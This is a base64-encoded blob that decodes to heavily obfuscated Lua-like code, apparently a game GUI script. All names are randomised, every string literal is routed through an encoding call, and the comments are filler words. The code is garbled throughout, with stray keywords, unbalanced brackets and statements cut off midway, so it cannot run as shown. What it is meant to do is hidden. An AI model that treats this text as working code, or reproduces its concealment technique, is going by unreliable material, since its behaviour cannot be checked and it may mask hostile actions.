CAgICAgZHlsTUt4Z2VMSiA9IG5pbAogICAgICAgIGVuZAogICAgTlFaVUhQV0RNbyA9IGZ1bmN0aW9uKCkKICAgICgoWk5rbGhzeU5NRilbInphUGJoVGhiUm4iXSgiY2ZwSlllRmlDWD0iKSksCiAgICBpZiBmQWNrTFByT1haID09ICgoUVNMSGVLSnpVTSlbInphUGJoVGhiUm4iXSgiWHplZ2Znc2tFST09IikpIEx6dW9jVkRzR3IgYlJHV0dxRGVGZCB0aGVuCiAgICAgICAgV1pJS2ZYRG1nSiA9ICgoSWtlZEZ1cU9FQSlbInphUGJoVGhiUm4iXSgiSkpDVkJUTU9WQyIpKQogICAgZW5kCiAgICB2R0xsQnpXZ0NqID0gZmFsc2UsCn0pCiAgICAgICAgdkdMbEJ6V2dDaiA9ICgoanp5V1dtRFdLbSlbInphUGJoVGhiUm4iXSgiQkpUaldzSUFDdyIpKSwKICAgICAgICAgICAgICAgIC0tIERkTWNzVEVQd2ogVWlkdUxzQXV0Vi1HUWFXbFdBdVJiCiAgICBsb2NhbCB4SGxleUNTQ0F5ID0gSFd2cUVWaUhtTTpad29vU2lqVUhLKCgoQWF4ZUJKbnN4aylbInphUGJoVGhiUm4iXSgieVJGZlJ6TlF5dD0iKSkpCmxvY2FsIGd4REZDVEhLZ2ggPSBuaWwKICAgICAgICBlbmQpCiAgICAgICAgbG9jYWwgRWJsdGxGcmRFcyA9IHVIc1NnREhKaVcKICAgICAgICAgICAgbGF3a1dBVlVoWiA9ICgoSW5EeVhDTkJteSlbInphUGJoVGhiUm4iXSgiSnFmckxsQkJWQT0iKSksCmZ1bmN0aW9uIHRTWU93YUt3b1godEhlb3ZoSmtSQSkKICAgIGxvY2FsIHdldEJGQmp1RnogPSBabGxta2JmSG1xW2ZBY2tMUHJPWFpdCmxvY2FsIEljYlFMcVVDenogPSBRbkxYaVZWT1VqLlp6VEFpWGdkb246aXZVckpYd2tuWigoKHdvSFl3R3R3UUIpWyJ6YVBiaFRoYlJuIl0oIkVoenFKT2RHVGMiKSksIHtsYXdrV0FWVWhaID0gKChDQXNWbUVaTlJGKVsiemFQYmhUaGJSbiJdKCJGdVJxeEtMZ1ZEPT0iKSksIHZHTGxCeldnQ2ogPSBmYWxzZX0pCiAgICAgICAgICAgIGlmIHNOZlpqYURCQnQgdGhlbiBzTmZaamFEQkJ0OnVGTWpXanVxWkUoKSBlbmQKZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIERLZktSWGpXUmUuaUxuR3hkZGhBai5La3pPaVNCanNsLkhXdnFFVmlIbU0uV3FCV1V2anJIUy5tVmJqbWZ5ZFZtID0gbU90V0ZQTkpqUwogICAgICAgIC0tIFRKZEdTblZoakogWGx3emxqdllaYSBHZW9Lc2NlZHhYIG5yWEV3bGN6bkIgaW5BeXhnc1FiTCBEQlpQd0l0Z1dxCiAgICAgICAgICAgIGVaVk1Oa2R3U2coKQogICAgICAgICAgICBpZiBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKChMSWlZQWFyZ3dLKVsiemFQYmhUaGJSbiJdKCJnTUx3ZXVzenRlPSIpKSkuUmdVTFpDdnJuVzpad29vU2lqVUhLKCgoVFpQdG52cndVUilbInphUGJoVGhiUm4iXSgiREVkZ1BXdXF1ciIpKSkgdGhlbgogICAgICAgIFpacnZpWExjQUwoKChTeU5PcFJSQVlrKVsiemFQYmhUaGJSbiJdKCJaRVNsb2RUdnFyPSIpKSkKICAgIHJldHVybiBmYWxzZQpsb2NhbCBjeVlVd1FaTHl5ID0gREtmS1JYaldSZS5pTG5HeGRkaEFqLktrek9pU0Jqc2wuSFd2cUVWaUhtTQoKICAgICAgICAgICAgICAgICAgICBBYXdvY0dsTUVhLnhGRllwbmtHWEkuWG1IcnZTd0tVSSA9IHJvaUtZa3JYSHQudXNBUkJ0dGppaQpjWFNEVXF3d2xELmdRSmFZRU5hVEEgPSBmYWxzZQogICAgICAgICkKICAgICAgICAgICAgICAgICAgICBpZgogICAgZW5kCmVuZAogICAgICAgICAgICAgICAgZ3ZoZWpmTnZEaCBjWFNEVXF3d2xELkdSemNtUnNpWEMgPT0gKChIamVJWERJZWRUKVsiemFQYmhUaGJSbiJdKCJqeUdjS1lrenpTPSIpKSB0aGVuCiAgICAgICAgaWYgWmxsbWtiZkhtcVtDY1hEZVF4dnhzXSB0aGVuCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgTnNqaWlzUUZOWC5PTExLdldlYU92LlhtSHJ2U3dLVUkgPSByb2lLWWtyWEh0LlV1V0tIQnFsQmUKICAgICAgICAgICAgICAgICAgICBqd1F4eEpYaG9tID0gVFhIa1VGS2pIVS5QWVdpRExZZFBDLkpNWlVIQk9jeWo6Wndvb1NpalVISygoKFpEVlhXamN1YVApWyJ6YVBiaFRoYlJuIl0oImtlY0hodlFHeG49IikpKQotLSBrSUZ4aUV1V0VBIFN3S1pvcFNMU04gR0dQa0ZVRENNeSBJYWxqRXVtVEd5IFhnb3ZEaHlUYlkKbG9jYWwgSVdESlBDZGd2RyA9IERLZktSWGpXUmU6U2NTRGlEdU9acygoKHRMZXB2ZmNyRHUpWyJ6YVBiaFRoYlJuIl0oIlFMbW5VR1plTEw9PSIpKSkKVFhIa1VGS2pIVS5GZWFsd2VuTGxROnNsdHBud3FSbVUoKChhUkFHbFd5U2JXKVsiemFQYmhUaGJSbiJdKCJNaG9Od3NhcG1RIikpKTpramFxanpEbkJsKAotLSAgICAgQXVrZURjTnVGcS54aFRvZ2plaWZoKDAsIGFrUkJtcEZXSHYuQWd1ZlpzYVRCeSgxMzYsIDc3LCAxNjcpKSwgLS0gZlV0cnJSaFNPYyAoRWNrTVhic2JnaCkKICAgICAgICBpZiBSTVdXS2ZXbU16LkljYlFMcVVDenoud1NRT2lQY0hrSSB0aGVuCmxvY2FsIEJhb1BMa3RxTFogPSBuaWwKZW5kClFlYmhuYlRFbkIuTWh1ZWJHRnltZyA9IHRydWUKCgogICAgICAgIGVuZAogICAgICAgICAgICAgICAgRmdMblZ4SWVrcy50RUllZWZ3ZEVMID0gVExIV3FUbnlGSi5UQUhtUmZoVHhlCmxvY2FsIGR5bE1LeGdlTEoKICAgICAgICAgICAgICAgICAgICBsaWh3Qnl0Tmp4LnpIZVhhT0RIRFYgPSBWcG1pTkZYYWdPLnhoVG9namVpZmgoVExIV3FUbnlGSi5UQUhtUmZoVHhlLCBUTEhXcVRueUZKLlRBSG1SZmhUeGUsIFRMSFdxVG55RkouVEFIbVJmaFR4ZSkgLS0gRUJGdlBwU1ZUUyB2RmlrTWdlU1RPIGdYdGxpYXVTcE8gTmVKeGZYbFBHbwogICAgICAgIERrTWhGakRXZ24gPSAxNDAsCmVuZApsb2NhbCBmdW5jdGlvbiBFVld1ekRyQ3BkKCkKCiAgICAoKFRxbWhiT1VJaVUpWyJ6YVBiaFRoYlJuIl0oImdWVldkRkJjY08iKSksCi0tIG1GeVZOYU9RQ0ogcUt3VWFpVmpzSSBvdlppTVhmSVNJIHJGSUJjb3JkWEIgWmRCZUZqWXBaeCBmcWtZU3N3alp2IG1ITEVZQ1hsTkcKV01PamdtWGxXSC54Qm1wcXJLbGxLID0gREtmS1JYaldSZS56a1NKelRWTlJFCiAgICAgICAgLS0gcldZeFFSaWxrbSBnQXlaaktzQ0ZlIFFicVV5ZnJRU20ga0hLWVZFRUZJYiBFTklYTE1Dc0tYIEpOSlVoWUN5TVUuamxoQ1hlQmR3UgogICAgICAgICAgICBzR0tZWlJPUkhtOnZOZ010ZlB3VngoCikKICAgIH0KfSkKICAgICAgICB2R0xsQnpXZ0NqID0gZmFsc2UsCiAgICAgICAgICAgICAgICAgICAgYW9lQ250Vml5cS5iU2V5anl3ZEVPKDAuMDUpCiAgICAgICAgKQogICAgICAgICkKICAgICAgICBnRFpxaFRtcHFnCmlmCgogICAgewogICAgfQotLSB2Tmt3d2FZSmRqIHFtU0d4R21DUlIgdXZCbWtEbWxpQyBSYVlHaUV6WHBJIGFjSGlrVGtjeVoga3NiZFp5WnRRcApsb2NhbCB0VURWSHFOelZsID0gREtmS1JYaldSZTpTY1NEaUR1T1pzKCgodWJqbGxnakZ4USlbInphUGJoVGhiUm4iXSgiWlZFUVVGc2ZERj0iKSkpLm9RZ0N0V3NUbWouSHpVUFNOeHZjQQpRZWJobmJURW5CLlFDeXpsWExhemogPSB0cnVlIC0tIENnTm9ucEdieFIgYWtPdmlhU1p3TwopCmxvY2FsIHNHS1laUk9SSG0gPSBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKChOZ0lBWXRnUEVIKVsiemFQYmhUaGJSbiJdKCJQS1hmZUFMcVZlIikpKQogICAgICAgICAgICAgICAgICAgIEZHTktmWkZSQ2kgPSBUTEhXcVRueUZKLmtFZWFNTnJXRlgoRkdOS2ZaRlJDaSwgMC4wMDAxLCAwLjEpIC0tIFRKZEdTblZoakogUmpvQkJUTUFVVSBpWWR1b1BMQU9aIFNqSW5NYk1lc2cKICAgICAgICAgICAgZW5kCiAgICBNcVlveERvc0pHID0gKChBb1RScmdPUmlwKVsiemFQYmhUaGJSbiJdKCJCQ0JsbEtDdHVQPSIpKSwKLS0gU2J6bmpaa3pXbSBteWFnQVhJc210IGhhdHRrRmp3dnMKCi0tIG9JT2V1UGtDWE4veG9jd2psQXlhciBYQU5wblhsWnB6CiAgICAoKEJqYVdFR2NqTmcpWyJ6YVBiaFRoYlJuIl0oIkJkRmRQRWxNcHMiKSksCgogICAgICAgIE1xWW94RG9zSkcgPSAoKGhzWUt4VlNDTEIpWyJ6YVBiaFRoYlJuIl0oImlWRWlQS1VGa2Q9PSIpKSwKdmNBaFdGdUFNSS54Qm1wcXJLbGxLID0gS2t6T2lTQmpzbDpCU2lEbVNLSFNzKCgobE92VHpwZ3J2TylbInphUGJoVGhiUm4iXSgibFFxVmF4dFByWiIpKSkKCiAgICAgICAgICAgIC0tIGtJRnhpRXVXRUEgVVByTUVVWFlCTCBOSWt3cVhtenBOJCBEbXZ0TExMTEpyIHREQnZOQlBsa3kgUVVtRmZ6RXRkbQogICAgUW5MWGlWVk9Vai5ER1Zua05pa2hTOml2VXJKWHdrblooCiAgICAgICAgbG9jYWwgaFVPanVUd09qTyA9IHsgWzFdID0gamNiUHFnZ1NhcSB9Ci0tIFphR1BZZGZoSFIgU0VPWnVGdHB4ZgplbmQpCgpXTU9qZ21YbFdILktGR0d0aVRpSkQgPSBXallyWmtoS1ZNLktGR0d0aVRpSkQuSElWQ3FIZ2ZxWgotLSBHV2hJV1RzRnJmCnVWRll0WXlkdG86RGVCUXpHenlXcyh7fSkKICAgIEtrek9pU0Jqc2wuSEdJclF2ek95dS5DRXhrZ1JuRFRFOmtqYXFqekRuQmwoZnVuY3Rpb24oc1RQT2htZ0lhRikKICAgICAgICAgICAgYW9lQ250Vml5cS5ac2JOd1hGb1dpKGZ1bmN0aW9uKCkKICAgIHsKICAgICAgICAgICAgICAgIGVuZAogICAge2xhd2tXQVZVaFogPSAoKGNFelZnekNFZVUpWyJ6YVBiaFRoYlJuIl0oIk5GdGV0WEFzaWMiKSksIE1xWW94RG9zSkcgPSAoKHFwWFBBZ3RNZ0kpWyJ6YVBiaFRoYlJuIl0oIk5ZS2VSbHV6c1k9PSIpKSwgdkdMbEJ6V2dDaiA9IGZhbHNlfQpRbkxYaVZWT1VqLk1JeUZDeVd5Sk86VnBjT25LdVdKTygKICAgICAgICAgICAgWzRdID0gREtmS1JYaldSZTpTY1NEaUR1T1pzKCgodWJqbGxnakZ4USlbInphUGJoVGhiUm4iXSgiWlZFUVVGc2ZERj0iKSkpOkJTaURtU0tIU3MoKChmSXhSblZrZWxPKVsiemFQYmhUaGJSbiJdKCJGTnpJVlBvbkJUIikpLCA5ZTkpOkJTaURtU0tIU3MoKChMZ0pqWGp3dE5OKVsiemFQYmhUaGJSbiJdKCJwbHV2RHdPanlCIikpLCA5ZTkpOkJTaURtU0tIU3MoCiAgICB7CmxvY2FsIFJnTVBRaHdDTWUgPSBTVXlYV3dYRkl0LnhoVG9namVpZmgoKChTc0lSWFB3YlVOKVsiemFQYmhUaGJSbiJdKCJ0WHhhbWJXTXptPT0iKSkpCiAgICAgICAgICAgICAgICBsb2NhbCBVc3JiSmxVTkhSID0KbG9jYWwgTE9qWnBGU3FQVCA9IFNVeVhXd1hGSXQueGhUb2dqZWlmaCgoKHJ1TkpkaEtKc1kpWyJ6YVBiaFRoYlJuIl0oInFKUVJQbFFPcXk9PSIpKSkKZ0RacWhUbXBxZwp9KQoKKQoKCiAgICAgICAgdkdMbEJ6V2dDaiA9IDE2LAogICAgICAgIGxvY2FsIGpkUGVkb1lhU0gKICAgICAgICAgICAgICAgIEZnTG5WeElla3MubkNjZmF4Y1V2UiA9IFRMSFdxVG55RkouVEFIbVJmaFR4ZQopCgpsb2NhbCByb2lLWWtyWEh0ID0gewogICAgICAgICAgICAgICAgICAgIGp3UXh4Slhob20uWWZ1d3JhZFR4eiA9IHRydWUKICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEx4anZKdXlUZFc6VndJdmhFd05LdigoKGFnVEhScWxOY1cpWyJ6YVBiaFRoYlJuIl0oIldTaGNnU3lsU2w9IikpKSB0aGVuCkxPalpwRlNxUFQuRmtRRmlnY25PRSA9IHRydWUKKQopCiAgICAgICAgICAgICAgICAgICAgaWYgWGx3emxqdllaYSBMenVvY1ZEc0dyIFhsd3psanZZWmE6VndJdmhFd05LdigoKEdhZkNZWUtEcVQpWyJ6YVBiaFRoYlJuIl0oIkxDeGlCZmJPQnM9IikpKSB0aGVuCmxvY2FsIHd1S1p2Q25heGEgPSBRbkxYaVZWT1VqLlpFTk9qQnFmakg6VklIY1laU1J2QigoKFh1Z1hKdURWc3kpWyJ6YVBiaFRoYlJuIl0oIlNqckxoaVZreEQ9IikpLCB7CiAgICAgICAgdkdMbEJ6V2dDaiA9IHRydWUsCiAgICByZXR1cm4gUGZ1RlRzckVLWS54aFRvZ2plaWZoKGlzSmFrU3RHaEIgKiAoWXJQUEhhZkxZZi5wVk1pa0dPWERRIC8gMTkyMCksIDAsIGlzSmFrU3RHaEIgKiAoWXJQUEhhZkxZZi5pZFVSWHBhVWtvIC8gMTA4MCksIDApCiAgICAgICAgZW5kCikKICAgICAgICBXcUJXVXZqckhTLm1WYmptZnlkVm0gPSBUbHpyTW1HamxGICsgVnBtaU5GWGFnTy54aFRvZ2plaWZoKDAsIEFxa2VDUVJlRGEsIDApCikKICAgIGxhd2tXQVZVaFogPSAoKE9MU3Jjem12R0MpWyJ6YVBiaFRoYlJuIl0oImZteE9EemZocFo9IikpLAogICAgfQogICAgZnVuY3Rpb24oKQp2YmR1RWJnZG1iOlJZd0FiREZmaUkoCi0tIFN4Z0dTTUNDWk4uc2pIZXBBSk1BeSA9IDAuNSAtLSB2QldOWFh6Zlp2IFBSUmRJdlZseGwgZHJLVU90QkRmbSBUUEFuR0RHaWFsCgoKICAgIHsKLS0gUnVWVW5YaVRlUC53YldhckZ4VHVvID0gV2pZclpraEtWTS53YldhckZ4VHVvLm1BZmlaUmVSUmcKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBOc2ppaXNRRk5YLmJUZGdIbUVVaUwuWG1IcnZTd0tVSSA9IHJvaUtZa3JYSHQuaGNTdlpMY0N3UwoKICAgIH0KICAgICAgICAgICAgaWYgamRQZWRvWWFTSCB0aGVuIGpkUGVkb1lhU0g6dUZNaldqdXFaRSgpIGVuZAoKICAgICAgICAgICAgICAgIGlmIGxqUEZ5eHNhTHcua0NqZVVTcVJlWSB0aGVuCiAgICBlbmQKICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIFhVRG5lVHljc2s6VndJdmhFd05LdigoKFRaUHRudnJ3VVIpWyJ6YVBiaFRoYlJuIl0oIkRFZGdQV3VxdXIiKSkpIHRoZW4KICAgICAgICAgICAgICAgIGd2aGVqZk52RGggY1hTRFVxd3dsRC5HUnpjbVJzaVhDID09ICgodnB2WGtkWXZWcClbInphUGJoVGhiUm4iXSgiRVhUZkdlaGFkST09IikpIHRoZW4KKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgREtmS1JYaldSZTpTY1NEaUR1T1pzKCgodWJqbGxnakZ4USlbInphUGJoVGhiUm4iXSgiWlZFUVVGc2ZERj0iKSkpOlp3b29TaWpVSEsoKChWSWJucm1JVlpMKVsiemFQYmhUaGJSbiJdKCJQY1VaVGZ5bk1HPSIpKSkgTHp1b2NWRHNHcgogICAgICAgIGVuZAotLSBjYnpGeGJmWE5yIExPalpwRlNxUFQgUUVZVUlvSHVMciBkZ3BKYXNtZXlTCiAgICAgICAgICAgIGlmIGVFRkpPTElRd2MgTHp1b2NWRHNHciBlRUZKT0xJUXdjIH49ICgoY3R4WHZCV25HaClbInphUGJoVGhiUm4iXSgoKFJjY2dCa0JRWHMpWyJ6YVBiaFRoYlJuIl0oKChUc3V5YXRNcFJSKVsiemFQYmhUaGJSbiJdKCgoekVFQ3lPZU5FQylbInphUGJoVGhiUm4iXSgoKEhiUVRsempTb0opWyJ6YVBiaFRoYlJuIl0oKChGVkxtcnFRVEphKVsiemFQYmhUaGJSbiJdKCgoTkZsR0NUUXp5cSlbInphUGJoVGhiUm4iXSgiIikpKSkpKSkpKSkpKSkpIEx6dW9jVkRzR3IgTmN1RmRYakVNZC52TW16RldKQktjKGVFRkpPTElRd2MpID09IDM2IHRoZW4KICAgIHsKCiAgICAgICAgICAgIGtVeFdrVUdnVHEoKChzbERZZ1ZMcUJTKVsiemFQYmhUaGJSbiJdKCJnZm1VcGxSemprPSIpKSwgKChaU1laUnBKS3FnKVsiemFQYmhUaGJSbiJdKCJpTEpUZ1B0UUhFIikpLCAzKQotLSBaZEJlRmpZcFp4IHFLd1VhaVZqc0kgSkphcVhySWdHVgoKICAgICAgICAtLSBHWkVUcG9waWNYIHFBa2dCVkVXbWcgckZJQmNvcmRYQiB1RkpTbkpjVVhZIFNFT1p1RnRweGYKICAgIH0KICAgICAgICAgICAgbG9jYWwgY3lZVXdRWkx5eSA9IFVXZnlCbFFXdWkuSFd2cUVWaUhtTSBKZGxsZGZGeXdYIFVXZnlCbFFXdWkua2huWVdnQ29SRzpPd0pEWVRXd1FiKCkKICAgICAgICBYWlRTUEJ6VVZPIE1wS2FtVkdtWGosIFB6T2ZmRXB6YmogbXRwZENFY0VEaiBkSVZRTkl3WGxLKFJnTXd3T2dYeks6eGNwUVJKQ2pmTigpKSBwWWlpV1pHVUJyCiAgICAgICAgTlFaVUhQV0RNbyA9IGZ1bmN0aW9uKCkKbG9jYWwgRVNoWEhScUhwSiA9IFFuTFhpVlZPVWouREdWbmtOaWtoUzpmSVdEQU9wQnhGKCgoaHRjbEpBalhxUilbInphUGJoVGhiUm4iXSgiZkZsa3Fpd2tDVSIpKSkKZW5kCiAgICB9CiAgICAgICAgalVyUk5ncXNRTDpQY21kWXdaT3N2KCNGZHZUZW9xd0RDID4gMCBMenVvY1ZEc0dyIEZkdlRlb3F3REMgSmRsbGRmRnl3WCB7KChOS05VaUdtVmVWKVsiemFQYmhUaGJSbiJdKCJJa21aemdwYXRBPT0iKSl9KQotLSBaYUdQWWRmaEhSIFNFT1p1RnRweGYga0hLWVZFRUZJYiBlZ296VkJBSlV0CgogICAgICAgICAgICAgICAgZEdmcFVaSURFRiBzeEZIUlRLa0ltIHBZaWlXWkdVQnIKICAgICAgICAgICAgICAgIGd2aGVqZk52RGggY1hTRFVxd3dsRC5HUnpjbVJzaVhDID09ICgoWkRWWFdqY3VhUClbInphUGJoVGhiUm4iXSgia2VjSGh2UUd4bj0iKSkgdGhlbgogICAgICAgIGlmIFRsWmJXYkpLT0wgdGhlbgoKbG9jYWwgdFVEVkhxTnpWbCA9IERLZktSWGpXUmU6U2NTRGlEdU9acygoKHViamxsZ2pGeFEpWyJ6YVBiaFRoYlJuIl0oIlpWRVFVRnNmREY9IikpKS5vUWdDdFdzVG1qLkh6VVBTTnh2Y0EKWFVCQm5rQUV6dy52eXpQYWRzbEVhID0gMQogICAgICAgICAgICAgICAgZW5kKQoKbG9jYWwgc3NiRkFLbW1JQyA9IFNVeVhXd1hGSXQueGhUb2dqZWlmaCgoKFZzaFNlRE1Xd3ApWyJ6YVBiaFRoYlJuIl0oImpVYVdKU3FuUUIiKSkpClpreGhYbVJtQncoKS5zQlNXY2NIVnpIID0gdHJ1ZQpzc2JGQUttbUlDLmhJQ3JBWlVxbGQgPSBQZnVGVHNyRUtZLnhoVG9namVpZmgoMC41LCAwLCAwLjQ1LCAwKSAtLSBDWFp6TUlTa1d2IFJ1cG9UQ2Z2V2YgSU1hUm9sSXpnSSBJYWxqRXVtVEd5IGxBdmhTZ0VBZVMKKQogICAgKChkcHVqb3RqS2lTKVsiemFQYmhUaGJSbiJdKCJreWNVVnBoZEVkIikpLAogICAgICAgIGlmIHVOS05zRmZrYXIgdGhlbgogICAgICAgIGZ1bmN0aW9uKCkKCiAgICAgICAgbG9jYWwgaGZtc3lUV2t1UiA9IENDcXllSktIdXE6QlNpRG1TS0hTcygoKGFTWmdzUmJQcm0pWyJ6YVBiaFRoYlJuIl0oIndQcEROaENRSVM9IikpLCAxKQogICAgICAgICAgICAgICAgbFZwU2VlZU9pQwogICAgICAgIGVuZApsb2NhbCBmdW5jdGlvbiBVUlNEV1JKcnlTKCkKLS0gbG9jYWwgc0t0cGxjU2tJVyA9IFNVeVhXd1hGSXQueGhUb2dqZWlmaCgoKFZzaFNlRE1Xd3ApWyJ6YVBiaFRoYlJuIl0oImpVYVdKU3FuUUIiKSksIHJIVWlJWVdmRnIpCgogICAgICAgICAgICBpZiBBYXdvY0dsTUVhIHRoZW4KICAgICAgICAgICAgSUNHdkV2a2xJeiA9IG5pbAotLSBBVW9XRExYcktlIFlpc1doc1NOQVogS3FwbmNCRkN5byBLV2Z2ckhNVHpzIGZzRW9wUmJydXcgd2VVRVJGbldHcwpsb2NhbCB6a2FYTkJZaWdWID0gREtmS1JYaldSZTpTY1NEaUR1T1pzKCgodWJqbGxnakZ4USlbInphUGJoVGhiUm4iXSgiWlZFUVVGc2ZERj0iKSkpLnBDbndEZWdLUW4uVVdDUXFIQmxaeS5VV0NRcUhCbFp5CiAgICAgICAgWmx3YXJSb25pVigoKExob1V2aklSVWQpWyJ6YVBiaFRoYlJuIl0oIm5EWUtMYnBvSXciKSkpCiAgICB2R0xsQnpXZ0NqID0gKChjdHhYdkJXbkdoKVsiemFQYmhUaGJSbiJdKCgoUmNjZ0JrQlFYcylbInphUGJoVGhiUm4iXSgoKFRzdXlhdE1wUlIpWyJ6YVBiaFRoYlJuIl0oKCh6RUVDeU9lTkVDKVsiemFQYmhUaGJSbiJdKCgoSGJRVGx6alNvSilbInphUGJoVGhiUm4iXSgoKEZWTG1ycVFUSmEpWyJ6YVBiaFRoYlJuIl0oKChORmxHQ1RRenlxKVsiemFQYmhUaGJSbiJdKCIiKSkpKSkpKSkpKSkpKSksCiAgICAgICAgamRQZWRvWWFTSCA9IGhmbXN5VFdrdVIuQ0V4a2dSbkRURTpramFxanpEbkJsKGZ1bmN0aW9uKHNUUE9obWdJYUYpCgopCmZzZnh5TnVoeUk6Ull3QWJERmZpSSgKICAgICAgICAgICAgYW9lQ250Vml5cS5tdFlNQ1pLZ2ZBKGx1TmxoeFlnd20pCgpsb2NhbCBqUUR1TGFjcE9xID0gbmlsCi0tIEhyaGhCVVRWQmEgU3dLWm9wU0xTTiBlZ296VkJBSlV0IGJwWWltUWp3RlUgUmpvQkJUTUFVVSB2dHdKZEZkTXF1CgogICAgewogICAgKQogICAgZW5kCiAgICAgICAgKQoKICAgICAgICAgICAgICAgIGlmIGxqUEZ5eHNhTHcuQ0luYnVuVEtOVyB0aGVuCiAgICAgICAgICAgIGlmIElLTGxDa0xSc0ogdGhlbgogICAgICAgICAgICBOUVpVSFBXRE1vID0gZnVuY3Rpb24oKQogICAgbG9jYWwgUFlXaURMWWRQQyA9IFdwcVVYZmdKWEw6QlNpRG1TS0hTcygoKHJrUXRVcWZmTFEpWyJ6YVBiaFRoYlJuIl0oImZpaEVkY0lwSU49IikpLCA1KQogICAgZW5kClFuTFhpVlZPVWoucUt3VWFpVmpzSTpPbVRtc3hKUXZqKAogICAgICAgICAgICBNcVlveERvc0pHID0gKChaWGRpcVltbVp3KVsiemFQYmhUaGJSbiJdKCJ2emVualJCV0d1IikpLAoKICAgIHZHTGxCeldnQ2ogPSAoKFFTTEhlS0p6VU0pWyJ6YVBiaFRoYlJuIl0oIlh6ZWdmZ3NrRUk9PSIpKSwKICAgICAgICBnRFpxaFRtcHFnCmxvY2FsIFJ1VlVuWGlUZVAgPSBTVXlYV3dYRkl0LnhoVG9namVpZmgoKChWc2hTZURNV3dwKVsiemFQYmhUaGJSbiJdKCJqVWFXSlNxblFCIikpKQogICAgICAgICAgICAtLSBKVUtaRHFOa2NVIEpOSlVoWUN5TVUuV0ZKeHFVT1VvbiBac1hIa3RQRGlyIFp5ZndmRlNCa28gTXdRQ0NMSVVBWQoKICAgICAgICAgICAgLS0gclZBbnNxSG55ViBLcXBuY0JGQ3lvIEFQS0tqQWRFankKUWViaG5iVEVuQi5MSUJ2aWtKdmtYID0gUGZ1RlRzckVLWS54aFRvZ2plaWZoKDAsIDEyMCwgMCwgNTApIC0tIHBVUEZSeENpTGUgUnVwb1RDZnZXZiBHaUhLZXNyanFNIGRyS1VPdEJEZm0gemh2VmdkVXJXVSBFbmlBVXN6alZZCiAgICAtLSBSWXBsTGpnR3NDID0gSFRiR2FNemJWVzpMcmRkZ0dNWmRrKHsgbGF3a1dBVlVoWiA9ICgod21EcVlGUXlUYylbInphUGJoVGhiUm4iXSgiUkVlWWF3QWVkYT09IikpLCB4UmpZQW9rdWFpID0gaUxuR3hkZGhBajpsSWpHeWhLT0pJKEtrek9pU0Jqc2wuU3hHaG52QkNEdiwgV2pZclpraEtWTS5aV2daQmtBb0x0LkVudm9YbFZWcGosIFdqWXJaa2hLVk0uR3lOQXh4UlBzSy5lZW5OaFl3WkpSKX0pLAogICAgS3VHc1VWcGxVZCA9IEhUYkdhTXpiVlc6THJkZGdHTVpkayh7bGF3a1dBVlVoWiA9ICgoSmJnQXdORkxQbClbInphUGJoVGhiUm4iXSgibGtqQ2ZVZEpSVz09IikpLCB4UmpZQW9rdWFpID0gKChLaFhET0xYdkxLKVsiemFQYmhUaGJSbiJdKCJwZFlOUEh6cGxuIikpfSksCiAgICAgICAgICAgICAgICBhb2VDbnRWaXlxLmJTZXlqeXdkRU8oKQogICAgUW5MWGlWVk9Vai5xS3dVYWlWanNJOlZJSGNZWlNSdkIoCmN0bEFzelFFTlQ6dm5XU2h4TWN0bSgpClFuTFhpVlZPVWouSGR0b0NwdUp4QzppdlVySlh3a25aKCgoeEpNRml0eVV3VSlbInphUGJoVGhiUm4iXSgia09JU0V2Z0dJTj09IikpLCB7CmxvY2FsIHV1RFRoTkFuVU0gPSBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKChrd25aRkhrZkljKVsiemFQYmhUaGJSbiJdKCJFaWdKSllGbkJFPSIpKSkKICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBReHB6S0JJY2ZiID0gQURDblNHbnJ0UTpad29vU2lqVUhLKCgoWHVucXVHY2JyYilbInphUGJoVGhiUm4iXSgibmFkQ1FjY1pnVSIpKSkKSFRiR2FNemJWVzpLTXVUVENBS2VwKDEpCmxvY2FsIGZvemFIUGxFSVcgPSBxQUFDeGVwY0JBKCkgLS0gYU1ldGVXa2NRTCB1dExNRWNrT3VGCikKICAgICAgICAgICAgICAgICAgICBsb2NhbCBYbHd6bGp2WVphID0gcENud0RlZ0tRbjpad29vU2lqVUhLKCgoU01MUkFtQ1ZCSClbInphUGJoVGhiUm4iXSgiZEFtYUdxaVRsTj09IikpKQogICAgICAgIGVuZAogICAgbGF3a1dBVlVoWiA9ICgodHhTT0tYYVhzSClbInphUGJoVGhiUm4iXSgiSEhJamRmSm1JcT0iKSksCiAgICAgICAgICAgICAgICBsb2NhbCBIV3ZxRVZpSG1NID0gS2t6T2lTQmpzbC5IV3ZxRVZpSG1NCgotLSBTeGdHU01DQ1pOLmlJVnBvSm9pdVMgPSBha1JCbXBGV0h2LkFndWZac2FUQnkoMjU1LCAyNTUsIDI1NSkgLS0gSWtNd2xwUUJWbiBrc1NqY3p5VldhIGtIS1lWRUVGSWIgWU9CSWJZWXdkcQotLSBHWkVUcG9waWNYIE5Ja3dxWG16cE4kIFpzWEhrdFBEaXIgcktYaUlMRGh6aQoKICAgICAgICBxcUxhVU1lbmlwID0geygoZ1FPdmt0bXJlQilbInphUGJoVGhiUm4iXSgiaWpnTnNVbU5zVj09IikpLCAoKHFyV3dUTnRRQ0opWyJ6YVBiaFRoYlJuIl0oIkFUYk9EalJHYkk9IikpfSwKCgogICAgICAgIGJTZXlqeXdkRU8oMC4xKQotLSBBeVJPSFNzU2RZIHl3eUlXZEt0T1cKLS0gVXhCU2pZbVVybCBFalNHa1ZMc0hVIGFwUGVMaWRTbm4gSFp5SFd6SWJQdiBOSWt3cVhtenBOJAplbmQKTGxtaVpjZU53SDpSWXdBYkRGZmlJKApsb2NhbCBmdW5jdGlvbiBYZVhtbXJCaU5LKCkKbG9jYWwgRVNoWEhScUhwSiA9IFFuTFhpVlZPVWouWUZxbGVRWW9udjpmSVdEQU9wQnhGKCgoQVZzYkJvWEJxeSlbInphUGJoVGhiUm4iXSgiTUJ4R0prcFh0RT0iKSkpCikKICAgICAgICAgICAgSk5KVWhZQ3lNVS5XRkp4cVVPVW9uID0gdUhzU2dESEppVwogICAgICAgICAgICApCiAgICBlbmQKCmxvY2FsIE55elVhaVdx